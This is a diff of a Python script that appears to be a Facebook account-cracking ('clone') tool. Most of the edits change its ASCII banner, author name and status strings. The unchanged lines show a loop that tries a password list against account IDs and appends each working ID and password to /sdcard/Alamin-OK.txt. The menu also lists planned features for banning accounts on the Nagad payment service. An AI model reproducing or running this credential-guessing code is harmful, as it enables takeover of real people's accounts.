@@ -56,29 +56,28 @@ def ____banner____():
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                                                 
       
-███████╗███████╗██████╗  █████╗ ████████╗
-██╔════╝██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
-█████╗  ███████╗██████╔╝███████║   ██║   
-██╔══╝  ╚════██║██╔══██╗██╔══██║   ██║   
-███████╗███████║██║  ██║██║  ██║   ██║   
-╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
-                                                                                                                                                   
-                                                                                                                                                                                                             
+██
+██╗███████╗██████╗  █████╗ ████████╗
+██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
+██║███████╗██████╔╝███████║   ██║   
+██║╚════██║██╔══██╗██╔══██║   ██║   
+██║███████║██║  ██║██║  ██║   ██║   
+╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                                                                                                                                                                                                                                                                                                                                                                             
  \x1b[37;41m\t ♥I♥M♥ ALAMIN-ESRAT\x1b[0;m\n\n\x1b[1;37m                              
 \n---------------------------------
 \033[1;91m  AUTHOR   : ALAMIN
 \033[1;91m  GITHUB   : PRIVT
 \033[1;91m  WHATSAPP : +
-\033[1;91m  TOOLS    : \033[1;32m X\033[1;37m                         
-\033[1;91m  VERSION  :   \033[1;35m     2025                                                                            
-\033[1;93m\033[1;93m """)
+\033[1;91m  TOOLS    : ALAMIN                 
+\033[1;91m  VERSION  :   2025                                                                            
+\033[1;91m\033[1;91m """)
     
 #______________MAIN DEF_______________#
 def main():
     ____banner____()
     #print("[1] FILE CLONE [SOON] ")
    # print("[2] RANDOM CLONEv[SOON]");os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
-    print("[3] START CLONE [2009][WORK]")
+    print("[3] START CLONE [ALAMIN][WORK]")
 #    print("[4] NAGAD HALF INFO[]SOON")
   #  print("[5] NAGAD BAN [SOON]")
     print("-------------------------------")
@@ -128,7 +127,7 @@ def fuckMyxAXN(series):
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
-    sys.stdout.write(f"\rAL-AMIN[{loop}]|OK:[{len(cps)}]")
+    sys.stdout.write(f"\rAL-AMIN ❣️[{loop}]|OK:[{len(cps)}]")
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -142,7 +141,7 @@ def Fucking_life(ids, passlist):
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1balaminKOK | {ids} • {pas}")
+                print(f"\r\r\x1b ISRAT-OK | {ids} • {pas}")
                 open("/sdcard/Alamin-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
